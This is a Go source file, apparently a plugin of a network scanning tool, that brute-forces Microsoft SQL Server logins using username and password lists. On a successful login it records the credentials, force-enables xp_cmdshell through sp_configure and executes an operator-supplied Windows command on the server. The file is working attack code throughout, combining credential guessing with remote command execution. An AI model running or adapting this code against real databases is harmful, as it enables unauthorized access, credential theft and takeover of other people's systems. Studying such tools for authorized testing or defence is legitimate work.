package plugins

import (
	"context"
	"database/sql"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"

	_ "github.com/denisenkom/go-mssqldb"
)

func MssqlScan(info *common.HostInfo) {
	starttime := time.Now().Unix()
	for _, user := range info.Usernames {
		for _, pass := range info.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := MssqlConn(info, user, pass)
			if flag == true && err == nil {
				return
			} else {
				if time.Now().Unix()-starttime > (int64(len(info.Usernames)*len(info.Passwords)) * info.Timeout) {
					return
				}
			}
		}
	}
}

func MssqlConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	Host, Port, Username, Password := info.Host, info.Port, user, pass
	dataSourceName := fmt.Sprintf("server=%s;user id=%s;password=%s;port=%v;encrypt=disable;timeout=%v", Host, Username, Password, Port, time.Duration(info.Timeout)*time.Second)
	db, err := sql.Open("mssql", dataSourceName)
	if err == nil {
		db.SetConnMaxLifetime(time.Duration(info.Timeout) * time.Second)
		db.SetConnMaxIdleTime(time.Duration(info.Timeout) * time.Second)
		db.SetMaxIdleConns(0)
		defer db.Close()
		err = db.Ping()
		if err == nil {
			result := fmt.Sprintf("[%s:%s] MSSQL credential %s/%s", Host, Port, Username, Password)
			log.Println(result)
			if info.Queue != nil {
				info.Queue.Push(result)
			}
			cmd := info.Command.WinCommand
			MssqlExec(db, cmd)
			flag = true

		}
	}
	return flag, err
}

func MssqlExec(db *sql.DB, cmd string) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	res, err := db.QueryContext(ctx, "select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'")
	if err != nil {
		return
	}
	for res.Next() {
		var count int
		if err = res.Scan(&count); err != nil {
			return
		}
		if count > 0 {
			db.ExecContext(ctx, "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
			db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", cmd))
		}
	}
	return
}
